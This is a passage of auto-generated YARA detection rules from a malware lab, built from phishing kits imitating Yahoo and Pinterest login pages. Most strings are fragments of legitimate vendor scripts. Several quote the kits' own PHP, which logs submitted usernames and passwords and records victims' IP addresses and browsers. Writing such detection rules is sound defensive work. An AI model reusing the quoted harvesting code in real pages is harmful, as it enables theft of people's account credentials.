      $s7 = "loadScript( false, base64_decode(input), true );" fullword ascii /* score: '12.00'*/
      $s8 = " * and call a new public method that will parse the positions list (currently inline-code in boot.js:_get_tags()" fullword ascii /* score: '12.00'*/
      $s9 = "TEiLCJzbG90SUQiOiIwIiwic2VydmVUeXBlIjoiLTEiLCJlcnIiOmZhbHNlLCJoYXNFeHRlcm5hbCI6ZmFsc2UsInN1cHBfdWdjIjoiMCIsInBsYWNlbWVudElEIjoiM" ascii /* score: '11.00'*/
      $s10 = "SI6IldoYXQgZG9uJ3QgeW91IGxpa2UgYWJvdXQgdGhpcyBhZD98SXQncyBvZmZlbnNpdmV8U29tZXRoaW5nIGVsc2V8VGhhbmsgeW91IGZvciBoZWxwaW5nIHVzIGltc" ascii /* score: '11.00'*/
      $s11 = "TQtMiIsInRwYlVSSSI6IiIsImhvc3RGaWxlIjoiaHR0cHM6XC9cL3MueWltZy5jb21cL3JxXC9kYXJsYVwvMy00LTJcL2pzXC9nLXItbWluLmpzIiwiZmRiX2xvY2FsZ" ascii /* score: '11.00'*/
      $s12 = "HNwJDE1MDAwMjUyOCxwdiQxLHYkMi4wKSkmdD1KXzMtRF8zJyk7XG5pZih3aW5kb3cueHpxX3MpeHpxX3MoKTtcbjxcL3NjcmlwdD48bm9zY3JpcHQ+PGltZyB3aWR0a" ascii /* score: '11.00'*/
      $s13 = "zpcXFwvXFxcL3MueWltZy5jb21cXFwvcnFcXFwvZGFybGFcXFwvMy00LTJcXFwvaHRtbFxcXC9yLWNzYy5odG1sXCIsXCJyb290XCI6XCJzZGFybGFcIixcImVkZ2VSb" ascii /* score: '11.00'*/
      $s14 = "C9cL3MueWltZy5jb21cL3JxXC9kYXJsYVwvMy00LTJcL2h0bWxcL3Itc2YuaHRtbCIsInNmYnJlbmRlclBhdGgiOiJodHRwczpcL1wvcy55aW1nLmNvbVwvcnFcL2Rhc" ascii /* score: '11.00'*/
      $s15 = "D0gbmV3IEZ1bmN0aW9uKCBhMCwgJ3h6cV90aGlzJywgdW5lc2NhcGUob2ZiKSk7XCIrWitcInJldHVybiBydjt9XCI7cmV0dXJuIG5ldyBGdW5jdGlvbihZLFMpfWVsc" ascii /* score: '11.00'*/
      $s16 = "C8qJks9MVwiPjxcL1NDUklQVD48c2NyaXB0PnZhciB1cmwgPSBcIlwiOyBpZih1cmwgJiYgdXJsLnNlYXJjaChcImh0dHBcIikgIT0gLTEpe2RvY3VtZW50LndyaXRlK" ascii /* score: '11.00'*/
      $s17 = "ztcbjxcL3NjcmlwdD48bm9zY3JpcHQ+PGltZyB3aWR0aD0xIGhlaWdodD0xIGFsdD1cIlwiIHNyYz1cImh0dHBzOlwvXC9iZWFwLWJjLnlhaG9vLmNvbVwveWk/YnY9M" ascii /* score: '11.00'*/
      $s18 = "VI9Ui5yZXBsYWNlKG5ldyBSZWdFeHAoXCIoW15hLXpBLVowLTkkX10pdGhpcyhbXmEtekEtWjAtOSRfXSlcIixcImdcIiksXCIkMXh6cV90aGlzJDJcIik7dmFyIFo9V" ascii /* score: '11.00'*/
      $s19 = "kNsM2FXNWtiM2N1ZUhweFgyUTlibVYzSUU5aWFtVmpkQ2dwT3dwM2FXNWtiM2N1ZUhweFgyUmJKM3A2V2xOMFVYSkpSWEozTFNkZFBTY29ZWE1rTVROaE1qbGpNWFZ2T" ascii /* score: '11.00'*/
      $s20 = "W51bGw7dmFyIFE9bmF2aWdhdG9yLmFwcE5hbWU7dmFyIEg9bmF2aWdhdG9yLmFwcFZlcnNpb247dmFyIEc9bmF2aWdhdG9yLnVzZXJBZ2VudDt2YXIgQT1wYXJzZUlud" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x280a and filesize < 40KB and
      8 of them
}

rule _opt_mal_phish__yahoo_home_ubuntu_malware_lab_samples_extracted_phishing_Yahoo_index {
   meta:
      description = "phish__yahoo - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__yahoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__yahoo_home_ubuntu_malware_lab_samples_extracted_phishing_Yahoo_login_2 {
   meta:
      description = "phish__yahoo - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__yahoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "b80ad5f4677aef8dc249d31fac3f815181620ec8df3358bc1a5e89cac2e7411f"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['passwd'] . \"\\n\", FILE_APPEND)" ascii /* score: '24.00'*/
      $s2 = "header('Location: https://yahoo.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__yahoo_home_ubuntu_malware_lab_samples_extracted_phishing_Yahoo_ip {
   meta:
      description = "phish__yahoo - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__yahoo phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s4 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s13 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__pinterest/phish__pinterest_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__pinterest
   Reference: phish__pinterest phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_3723580519_idpiframe {
   meta:
      description = "phish__pinterest - file 3723580519-idpiframe.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "cbefcaee859db9969b16d0554d95f83bd0f840a7c7cbb1b565a3850702e97e60"
   strings:
      $x1 = "var nc=function(){var a=Va(\"origin\");if(!a)throw\"Failed to get parent origin from URL hash!\";var b=Va(\"rpcToken\");if(!b)th" ascii /* score: '33.00'*/
      $x2 = "function(){d(a)})})):(a=a||{},d(a))};b.forceRefresh?zb(this.F,f,v):Sb(this.g,g,e,f.response_type,f.scope,b.id,function(a){a&&18E" ascii /* score: '33.00'*/
      $s3 = "G.eb=function(a){if(!a)return[];a=G.cb(a);try{return E.parse(a).items||[]}catch(b){return A(\"Error while parsing items from coo" ascii /* score: '30.00'*/
      $s4 = "id=d.clientId;e.login_hint=d.loginHint;e.ss_domain=g.domain;Ab(this.F,e,c)}else c({error:\"user_logged_out\"})};" fullword ascii /* score: '28.00'*/
      $s5 = "e.readyState&&200==e.status){var a;e.responseText&&(a=E.parse(e.responseText));c(a)}else 4==e.readyState&&0==e.status?c({error:" ascii /* score: '28.00'*/
      $s6 = "A:X(a,a.Lb),D:X(a,a.Mb)});b.I.push({type:\"idpReady\"});b.I.push({type:\"idpError\"});b.I.push({type:\"sessionStateChanged\",fil" ascii /* score: '27.00'*/
      $s7 = "4<a.expires_at-(new Date).getTime()?dc(c.H,e,a,m,function(){d(a)}):zb(c.F,f,v)})}else U(c.b,a.id,{error:\"user_logged_out\"})};h" ascii /* score: '26.00'*/
      $s8 = "function(a){var b=[],c;for(c in a)if(a.hasOwnProperty(c)){var d=a[c];if(null===d||void 0===d)d=\"\";b.push(encodeURIComponent(c)" ascii /* score: '26.00'*/
      $s9 = "function mc(a,b){if(!b.length)return null;var c=a.toLowerCase();b=ha(b);for(var d=b.next();!d.done;d=b.next())if(d=d.value,d.log" ascii /* score: '24.00'*/
      $s10 = "h.kb=function(a){var b=a.params||{},c=this,d=function(b){U(c.b,a.id,b)},e=b.clientId,g=b.loginHint,f=b.request,n=b.sessionSelect" ascii /* score: '23.00'*/
      $s11 = "lc.prototype.s=function(a,b,c,d){b&&(b.expires_at=(new Date).getTime()+864E5);Q.prototype.s.call(this,a,b,c,d)};W.prototype.hb=f" ascii /* score: '23.00'*/
      $s12 = "deURIComponent(b);b=a.exec(b);return null==b?\"\":b[1].replace(/\\+/g,\" \")},Wa=function(a,b,c){if(a.addEventListener)a.addEven" ascii /* score: '22.00'*/
      $s13 = "m)})}else d({scope:g.scope,sessions:[]})};h.zb=function(a){a=a&&a.params||{};return a.clientId&&!K(a.clientId)};h.sb=function(a)" ascii /* score: '22.00'*/
      $s14 = "or;f.client_id=e;f.login_hint=g;f.ss_domain=n.domain;var m=L(this.m);if(m){var v=function(a){a&&!a.error&&a.login_hint?(a.first_" ascii /* score: '22.00'*/
      $s15 = "this.m.addListener(function(a){ac(e,a)})},cc=function(a){var b=[],c;for(c in a.u){var d=a.u[c].G;d&&b.push(d)}return b},ac=funct" ascii /* score: '22.00'*/
      $s16 = "network_error\"}):4==e.readyState&&c({error:\"server_error\",error_subtype:e.responseText})};e.open(\"POST\",d,!0);e.setRequestH" ascii /* score: '21.00'*/
      $s17 = "port||443==c.port)||\"http:\"==c.protocol&&(\"\"==c.port||0==c.port||80==c.port))for(a=c.hostname.split(\".\");1<a.length;)b.pus" ascii /* score: '21.00'*/
      $s18 = "h.getItem=function(a,b){b(this.Z.getItem(a))};h.setItem=function(a,b,c){void 0===b||null===b?this.Z.removeItem(a):this.Z.setItem" ascii /* score: '21.00'*/
      $s19 = "type.Ga=function(){var a={w:[],I:[]};gc(this,a);a.w.push({method:\"gsi:fetchLoginHint\",A:X(this,this.hb),K:!0,D:X(this,this.ib)" ascii /* score: '21.00'*/
      $s20 = "N.prototype.ka=function(a){var b=[];if(a){var c=document.createElement(\"a\");c.href=a;if(\"https:\"==c.protocol&&(\"\"==c.port|" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_25936583_postmessagerelay {
   meta:
      description = "phish__pinterest - file 25936583-postmessagerelay.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "90b76c66de26d1674e85a63879ddbcb6c59a095f0b42e166aaa07dfdb94e4b0b"
   strings:
      $x1 = "var h=this,q=function(a,c){a=a.split(\".\");var b=h;a[0]in b||\"undefined\"==typeof b.execScript||b.execScript(\"var \"+a[0]);fo" ascii /* score: '42.00'*/
      $s2 = "\"1\"===decodeURIComponent(V[V.length-1]||\"\")?(R=function(a,c,b,d,e,f){P.send(c,e,d,f||gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTE" ascii /* score: '29.00'*/
      $s3 = "?::\\d+)?/.exec(a);c=gapi.iframes.makeWhiteListIframesFilter([c?c[0]:null]);R(\"..\",\"oauth2callback\",gadgets.rpc.getAuthToken" ascii /* score: '21.00'*/
      $s4 = "var h=this,q=function(a,c){a=a.split(\".\");var b=h;a[0]in b||\"undefined\"==typeof b.execScript||b.execScript(\"var \"+a[0]);fo" ascii /* score: '19.00'*/
      $s5 = "da);S(\"get_versioninfo\",ea)}):(R=function(a,c,b,d,e){gadgets.rpc.call(a,c+\":\"+b,d,e)},S=function(a,c){gadgets.rpc.register(a" ascii /* score: '17.00'*/
      $s6 = "d=8*k;56>g?b(n,56-g):b(n,64-(g-56));for(var p=63;56<=p;p--)f[p]=d&255,d>>>=8;c(f);for(p=d=0;5>p;p++)for(var m=24;0<=m;m-=8)a[d++" ascii /* score: '16.00'*/
      $s7 = "ocument.body)if(a=a.document.body,v(null!=a,\"goog.dom.setTextContent expects a non-null value for node\"),\"textContent\"in a)a" ascii /* score: '15.00'*/
      $s8 = "K.prototype.evaluate=function(){var a={},c=\"\";try{c=String(document.cookie||\"\")}catch(m){}c=c.split(\"; \").join(\";\").spli" ascii /* score: '14.00'*/
      $s9 = "\"),void 0,a)},Q=function(){U()},U=function(){R(\"..\",\"oauth2relayReady\",gadgets.rpc.getAuthToken(\"..\"));S(\"check_session_" ascii /* score: '13.00'*/
      $s10 = "tContent=\"Please close this window.\";else if(3==a.nodeType)a.data=\"Please close this window.\";else if(a.firstChild&&3==a.fir" ascii /* score: '13.00'*/
      $s11 = "ar e=String(c[b]||\"\");e&&a.push(e)}if(2>a.length)return null;c=a[0];b=gadgets.rpc.getOrigin(a[1]);if(b!==a[1])return null;a=a." ascii /* score: '12.00'*/
      $s12 = ");S(\"get_versioninfo\",O)});" fullword ascii /* score: '12.00'*/
      $s13 = "\"1\"===decodeURIComponent(V[V.length-1]||\"\")?(R=function(a,c,b,d,e,f){P.send(c,e,d,f||gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTE" ascii /* score: '12.00'*/
      $s14 = "tion(a){window.setTimeout(function(){T(a)},1)},da=function(a){if(a){var c=a.session_state;var b=a.client_id}return N(c,b,P.getOr" ascii /* score: '12.00'*/
      $s15 = "var ca=function(){var a=U;window.gapi.load(\"gapi.iframes\",function(){P=gapi.iframes.getContext().getParentIframe();a()})},W=fu" ascii /* score: '11.00'*/
      $s16 = "};q(\"checkSessionState\",N);q(\"getVersionInfo\",O);var P,Q,R,S,T,U,ba=window,V=(window.location.href||ba.location.href).match(" ascii /* score: '11.00'*/
      $s17 = ",T=function(a){gadgets.rpc.getTargetOrigin(\"..\")==gadgets.rpc.getOrigin(a)&&R(\"..\",\"oauth2callback\",gadgets.rpc.getAuthTok" ascii /* score: '11.00'*/
      $s18 = "da);S(\"get_versioninfo\",ea)}):(R=function(a,c,b,d,e){gadgets.rpc.call(a,c+\":\"+b,d,e)},S=function(a,c){gadgets.rpc.register(a" ascii /* score: '11.00'*/
      $s19 = "a?null:c[a]||null):a=null:a=null;return a},M=function(a){a=String(a.origin||\"\");if(!a)throw Error(\"RPC has no origin.\");retu" ascii /* score: '11.00'*/
      $s20 = "==gadgets.rpc.getOrigin(String(window.location.href)).indexOf(\"https://\")?\"SAPISID\":\"APISID\",this.h=String(this.b[a]||" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule clientplusone {
   meta:
      description = "phish__pinterest - file clientplusone.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "9ea50f8f777b35cbd64aaaba5513cd0d9122b139e293f3db7c159530e4cc50e9"
   strings:
      $x1 = "gapi.load(\"client:plusone\",{callback:window[\"gapi_onload\"],_c:{\"jsl\":{\"ci\":{\"deviceType\":\"desktop\",\"oauth-flow\":{" ascii /* score: '59.00'*/
      $x2 = "xc=!!wc&&\"function\"==typeof wc.getRandomValues;xc||(Bc=1E6*(screen.width*screen.width+screen.height),Cc=Ec(t.cookie+\"|\"+t.lo" ascii /* score: '35.00'*/
      $x3 = "var Ta=function(a,b,c){var d=Qa.r;\"function\"===typeof d?d(a,b,c):d.push([a,b,c])},G=function(a,b,c){Ra[a]=!b&&Ra[a]||c||(new D" ascii /* score: '34.00'*/
      $x4 = "ethrowException\":false,\"host\":\"https://apis.google.com\"},\"enableMultilogin\":true,\"googleapis.config\":{\"auth\":{\"useFi" ascii /* score: '33.00'*/
      $x5 = "c){return a?Sc()[c]||a[c]||\"\":Sc()[c]||\"\"}};var Vc=function(a){var b;a.match(/^https?%3A/i)&&(b=decodeURIComponent(a));retur" ascii /* score: '33.00'*/
      $x6 = "t.google.com/:session_prefix:talkgadget/_/widget\"},\":gplus_url:\":\"https://plus.google.com\",\"rbr_i\":{\"params\":{\"url\":" ascii /* score: '31.00'*/
      $x7 = "03d1\"},\"savetoandroidpay\":{\"url\":\"https://androidpay.google.com/a/widget/save\"},\"blogger\":{\"params\":{\"location\":[\"" ascii /* score: '31.00'*/
      $s8 = "1],\"___goc\")&&\"undefined\"===typeof a[a.length-1].___goc&&(c=a.pop());N(c,b);a.push(c)},xb=function(a){M(!0);var b=window.___" ascii /* score: '30.00'*/
      $s9 = "(l[\"data-postorigin\"]=f);f=Pc(b,c,l,e);if(-1!=navigator.userAgent.indexOf(\"WebKit\")){var u=f.contentWindow.document;u.open()" ascii /* score: '30.00'*/
      $s10 = "c=D(b);b=c.w;c.query.length&&(b+=\"?\"+c.query.join(\"\"));c.g.length&&(b+=\"#\"+c.g.join(\"\"));a.href=b;e.appendChild(a);e.inn" ascii /* score: '30.00'*/
      $s11 = "w\":{\"url\":\"https://apis.google.com/marketplace/button?usegapi\\u003d1\",\"methods\":[\"launchurl\"]},\":signuphost:\":\"http" ascii /* score: '28.00'*/
      $s12 = "com/shopping/customerreviews/optin?usegapi\\u003d1\"},\":socialhost:\":\"https://apis.google.com\",\"hangout\":{\"url\":\"https:" ascii /* score: '28.00'*/
      $s13 = "l.indexOf(\"g:\");0==n?p=l.substr(2):(n=(n=String(k.className||k.getAttribute(\"class\")))&&kd.exec(n))&&(p=n[1]);h=!p||!(W[p]||" ascii /* score: '28.00'*/
      $s14 = "le.com\",\"community\":{\"url\":\":ctx_socialhost:/:session_prefix::im_prefix:_/widget/render/community?usegapi\\u003d1\"},\"plu" ascii /* score: '27.00'*/
      $s15 = "]},\"url\":\":socialhost:/:session_prefix:_/widget/render/blogger?usegapi\\u003d1\",\"methods\":[\"scroll\",\"openwindow\"]},\"e" ascii /* score: '27.00'*/
      $s16 = "ib=function(a,b,c){a=a[b];!a&&c&&J(\"missing: \"+b);if(a){if(Za.test(a))return a;J(\"invalid: \"+b)}return null},db=/^https?:\\/" ascii /* score: '26.00'*/
      $s17 = "null==g&&(g=d.gwidget&&d.gwidget.db));f.db=g||void 0;g=b.ecp;d=O();null==g&&d&&(g=d.ecp,null==g&&(g=d.gwidget&&d.gwidget.ecp));f" ascii /* score: '26.00'*/
      $s18 = "https://gsuite.google.com/:session_prefix:marketplace/appfinder?usegapi\\u003d1\"},\"person\":{\"url\":\":socialhost:/:session_p" ascii /* score: '25.00'*/
      $s19 = "s://accounts.google.com/o/oauth2/auth\",\"proxyUrl\":\"https://accounts.google.com/o/oauth2/postmessageRelay\",\"disableOpt\":tr" ascii /* score: '25.00'*/
      $s20 = "(f=a.createElement(\"iframe\"),g&&(f.onload=function(){f.onload=null;g.call(this)},Kc(d)))}f.setAttribute(\"ng-non-bindable\",\"" ascii /* score: '25.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule Z4_JZrbn7cR {
   meta:
      description = "phish__pinterest - file Z4_JZrbn7cR.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "042a7dba3092614c62f8a55bcdb963a20162a34a791ee1587a7ed98e581f7782"
   strings:
      $x1 = "__d(\"BigPipe\",[\"ix\",\"Arbiter\",\"BigPipeExperiments\",\"BigPipePlugins\",\"Bootloader\",\"Env\",\"ErrorUtils\",\"FBLogger\"" ascii /* score: '80.00'*/
      $x2 = "__d(\"AsyncRequest\",[\"errorCode\",\"fbt\",\"invariant\",\"ix\",\"Promise\",\"Arbiter\",\"ArtilleryAsyncRequestTracingAnnotator" ascii /* score: '77.50'*/
      $x3 = "__d(\"TimeSliceInteraction\",[\"invariant\",\"Arbiter\",\"ArtilleryComponentSaverOptions\",\"ArtilleryJSPointTypes\",\"Artillery" ascii /* score: '67.00'*/
      $x4 = "__d(\"BanzaiOld\",[\"BanzaiAdapter\",\"BanzaiStreamPayloads\",\"CurrentUser\",\"ErrorUtils\",\"ExecutionEnvironment\",\"FBJSON\"" ascii /* score: '64.00'*/
      $x5 = "__d(\"Run\",[\"Arbiter\",\"BigPipe\",\"ContextualComponent\",\"ExecutionEnvironment\",\"PageEvents\",\"TimeSlice\",\"createCance" ascii /* score: '60.00'*/
      $x6 = "__d(\"Bootloader\",[\"ix\",\"Arbiter\",\"BootloaderConfig\",\"CallbackDependencyManager\",\"CSRFGuard\",\"CSSLoader\",\"ErrorUti" ascii /* score: '60.00'*/
      $x7 = "__d(\"BrowserEventBasedInteraction\",[\"Bootloader\",\"FBLogger\",\"PageDOMMutationObserver\",\"TimeSliceAutoclosedInteraction\"" ascii /* score: '57.00'*/
      $x8 = "__d(\"TimeSlice\",[\"invariant\",\"CallStackExecutionObserver\",\"CircularBuffer\",\"Env\",\"ErrorUtils\",\"FBLogger\",\"Interva" ascii /* score: '56.00'*/
      $x9 = "__d(\"Event\",[\"invariant\",\"event-form-bubbling\",\"Arbiter\",\"DataStore\",\"DOMEvent\",\"DOMEventListener\",\"DOMQuery\",\"" ascii /* score: '55.00'*/
      $x10 = "__d(\"EventProfilerEagerExecution\",[\"EventConfig\",\"FBLogger\",\"ProfilingCounters\",\"TimeSliceReferenceCounting\"],(functio" ascii /* score: '55.00'*/
      $x11 = "__d(\"EventProfiler\",[\"Arbiter\",\"Bootloader\",\"BrowserEventBasedInteraction\",\"CurrentEventMeta\",\"EventConfig\",\"EventP" ascii /* score: '55.00'*/
      $x12 = "__d(\"FetchStreamTransport\",[\"regeneratorRuntime\",\"ArbiterMixin\",\"FBLogger\",\"FetchStreamConfig\",\"StreamBlockReader\"," ascii /* score: '55.00'*/
      $x13 = "__d(\"EventProfilerInteractionTracker\",[\"Bootloader\",\"BrowserEventBasedInteraction\",\"EventProfilerEagerExecution\",\"Event" ascii /* score: '53.00'*/
      $x14 = "__d(\"JSONPTransport\",[\"ArbiterMixin\",\"DOM\",\"HTML\",\"TimeSlice\",\"URI\",\"mixin\"],(function(a,b,c,d,e,f){__p&&__p();var" ascii /* score: '52.00'*/
      $x15 = "__d(\"ProfilingCounters\",[\"ErrorUtils\",\"ExecutionContextObservers\",\"OnDemandExecutionContextObserver\",\"ProfilingCounters" ascii /* score: '51.00'*/
      $x16 = "__d(\"KeyEventController\",[\"Bootloader\",\"DOMQuery\",\"Event\",\"Run\",\"emptyFunction\",\"getElementText\",\"isContentEditab" ascii /* score: '45.00'*/
      $x17 = "__d(\"regeneratorRuntime\",[\"Promise\"],(function(a,b,c,d,e,f){\"use strict\";__p&&__p();var g=Object.prototype.hasOwnProperty," ascii /* score: '44.00'*/
      $x18 = "__d(\"ErrorUtils\",[\"Env\",\"LogviewForcedKeyError\",\"eprintf\",\"erx\",\"removeFromArray\",\"sprintf\"],(function(a,b,c,d,e,f" ascii /* score: '44.00'*/
      $x19 = "__d(\"DOM\",[\"DOMQuery\",\"Event\",\"FBLogger\",\"FbtResultBase\",\"HTML\",\"TAAL\",\"UserAgent_DEPRECATED\",\"$\",\"createArra" ascii /* score: '42.00'*/
      $x20 = "__d(\"Form\",[\"DataStore\",\"DOM\",\"DOMQuery\",\"DTSG\",\"Input\",\"LSD\",\"PHPQuerySerializer\",\"Random\",\"URI\",\"getEleme" ascii /* score: '42.00'*/
   condition:
      uint16(0) == 0x6669 and filesize < 1000KB and
      1 of ($x*)
}

rule entryChunk_www_unauth_a04e2ef9d883ee259f83 {
   meta:
      description = "phish__pinterest - file entryChunk-www-unauth-a04e2ef9d883ee259f83.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "2cdcd2d7ef292bcb550da8a8212a4183aa37d58e8c35df1a34dc954b3ef7beb8"
   strings:
      $x1 = "n._Febr._Mrz._Apr._Mai_Jun._Jul._Aug._Sept._Okt._Nov._Dez.\".split(\"_\"),monthsParseExact:!0,weekdays:\"Sonntag_Montag_Dienstag" ascii /* score: '83.00'*/
      $x2 = "s your Pin doing? See the stats...\",\"Pin Analytics NUX\")))))))},t}(te.Component);_n.defaultProps={showOnPinAnalyticsNUX:!1,on" ascii /* score: '81.50'*/
      $x3 = ";return null==n?t:null!=e.meridiemHour?e.meridiemHour(t,n):null!=e.isPM?((r=e.isPM(n))&&t<12&&(t+=12),r||12!==t||(t=0),t):t}func" ascii /* score: '81.00'*/
      $x4 = "\"}})})},\"284h\":function(e,t,n){\"use strict\";function r(e,t){var n=e*Math.pow(10,t),r=Math.round(10*(n-parseInt(n,10)))/10;r" ascii /* score: '80.00'*/
      $x5 = "\",v=\"NZ\",I=\"NZD\",w=\"$\",O=\"30\",A=1,C=365,R=!1,S=64,T=.1*a,k=1e4,B=1e5*a},AcTh:function(e,t,n){\"use strict\";function r(" ascii /* score: '79.00'*/
      $x6 = ";e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setProto" ascii /* score: '76.00'*/
      $x7 = "\";default:return e}},week:{dow:1,doy:7}})})},PYDR:function(e,t){e.exports=\"https://s.pinimg.com/webapp/style/images/KO-2x-8206" ascii /* score: '75.00'*/
      $x8 = "})}},nCtG:function(e,t,n){var r=/^\\./,a=/[^.[\\]]+|\\[(?:(-?\\d+(?:\\.\\d+)?)|([\"'])((?:(?!\\2)[^\\\\]|\\\\.)*?)\\2)\\]|(?=(?:" ascii /* score: '75.00'*/
      $x9 = "\",MM:t,y:\"un an\",yy:t},week:{dow:1,doy:7}})})},J2FB:function(e,t,n){\"use strict\";function r(e,t){if(!(e instanceof t))throw" ascii /* score: '72.00'*/
      $x10 = "le] [subote] [u] LT\"][this.day()]},sameElse:\"L\"},relativeTime:{future:\"za %s\",past:\"pre %s\",s:\"nekoliko sekundi\",m:t.tr" ascii /* score: '71.00'*/
      $x11 = "\",\"xperia\",\"xxx\",\"xyz\",\"yachts\",\"yahoo\",\"yamaxun\",\"yandex\",\"ye\",\"yodobashi\",\"yoga\",\"yokohama\",\"you\",\"y" ascii /* score: '71.00'*/
      $x12 = "\"},week:{dow:1,doy:7}})})},s7Vk:function(e,t,n){function r(e,t){var n=i(e),r=!n&&o(e),d=!n&&!r&&s(e),p=!n&&!r&&!d&&l(e),f=n||r|" ascii /* score: '70.00'*/
      $x13 = "\",yy:t.translate},ordinalParse:/\\d{1,2}\\./,ordinal:\"%d.\",week:{dow:1,doy:7}})})},\"H+F8\":function(e,t,n){\"use strict\";fu" ascii /* score: '70.00'*/
      $x14 = "webpackJsonp([\"entryChunk-www-unauth\",144],{\"+71V\":function(e,t,n){\"use strict\";function r(e){return{type:\"ACTIVITY_ITEM_" ascii /* score: '70.00'*/
      $x15 = "\";var n=e%10,r=e%100-n,a=e>=100?100:null;return e+(t[n]||t[r]||t[a])},week:{dow:1,doy:7}})})},\"5d5L\":function(e,t,n){function" ascii /* score: '69.00'*/
      $x16 = "t be able to save ideas or browse your personalized home feed!\",'explanation of \"Log out\" showing underneath the \"Log out\" " ascii /* score: '69.00'*/
      $x17 = "li] dddd [u] LT\"}},sameElse:\"L\"},relativeTime:{future:\"za %s\",past:\"prije %s\",s:\"par sekundi\",m:t,mm:t,h:t,hh:t,d:\"dan" ascii /* score: '69.00'*/
      $x18 = "\")},week:{dow:7,doy:12}})})},Eo58:function(e,t,n){e.exports=function(){return new Promise(function(e){n.e(4).then(function(t){e" ascii /* score: '69.00'*/
      $x19 = "c %s\",past:\"pirms %s\",s:a,m:r,mm:n,h:r,hh:n,d:r,dd:n,M:r,MM:n,y:r,yy:n},ordinalParse:/\\d{1,2}\\./,ordinal:\"%d.\",week:{dow:" ascii /* score: '69.00'*/
      $x20 = "\",destination_url:o,duration:s,auto_targeting_enabled:c,is_ongoing:l,pin:r.id,targeting_spec:m}};t.e=r,t.c=a,t.d=i,t.a=l,t.b=u}" ascii /* score: '69.00'*/
   condition:
      uint16(0) == 0x6577 and filesize < 7000KB and
      1 of ($x*)
}

rule _opt_mal_phish__pinterest_home_ubuntu_malware_lab_samples_extracted_phishing_Pinterest_login_files_sdk_003 {
   meta:
      description = "phish__pinterest - file sdk_003.js"
      author = "Comps Team Malware Lab"
      reference = "phish__pinterest phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "c9a293c7ffe655bc6fd9816e4c3e7a0095477d9e8edcce93807e5791e01cc535"
   strings:
      $x1 = "__d(\"XDM\",[\"sdk.DOMEventListener\",\"DOMWrapper\",\"Flash\",\"GlobalCallback\",\"Log\",\"UserAgent_DEPRECATED\",\"emptyFuncti" ascii /* score: '56.50'*/
      $x2 = "__d(\"sdk.AppEvents\",[\"AppUserPropertyAPIBuiltinField\",\"Assert\",\"FBAppEvents\",\"sdk.Auth\",\"sdk.Event\",\"sdk.Impression" ascii /* score: '56.00'*/
